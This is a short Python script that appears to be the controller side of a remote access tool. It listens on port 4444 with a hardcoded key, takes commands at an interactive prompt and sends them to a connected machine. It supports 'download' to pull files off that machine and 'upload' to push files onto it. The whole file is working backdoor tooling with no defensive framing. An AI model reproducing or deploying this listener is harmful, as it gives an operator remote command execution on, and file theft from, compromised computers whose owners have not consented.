#!/usr/bin/env python3
import multiprocessing.connection as connection

address = "0.0.0.0"
port = 4444
key = b"cuylerwashere"

def write_file(filename, contents):
    with open(filename, 'wb') as fd:
        fd.write(contents)

def get_file_contents(filepath):
    with open(filepath, 'rb') as fd:
        contents = fd.read()
    return contents

def execute_remotely(conn, command):
    conn.send(command)
    results = conn.recv_bytes()

    if command.startswith("download") and not results.startswith(b"[-]"):
        filename = command.split(' ')[1].split('/')[-1]
        write_file(filename, results)
        results = "[+] Downloaded {}".format(filename)
    elif command.startswith("upload") and results.startswith(b"Ready"):
        filepath = command.split(' ')[1]
        try:
            file_contents = get_file_contents(filepath)
            conn.send_bytes(file_contents)
            results = "[+] {} successfully uploaded".format(filepath)
        except:
            conn.send_bytes(b"Failed")
            results = "[-] Could not find {}, failed to upload file".format(filepath)
    else:
        results = results.decode()[:-1] if results.endswith(b'\n') else results.decode()

    return results

with connection.Listener((address, port), authkey=key) as listener:
    print("[+] Waiting for incoming connections on port {}".format(port))
    with listener.accept() as conn:
        print("[+] Received connection from {} port {}".format(*listener.last_accepted))
        while True:
            command = input(">> ")
            print(execute_remotely(conn, command))


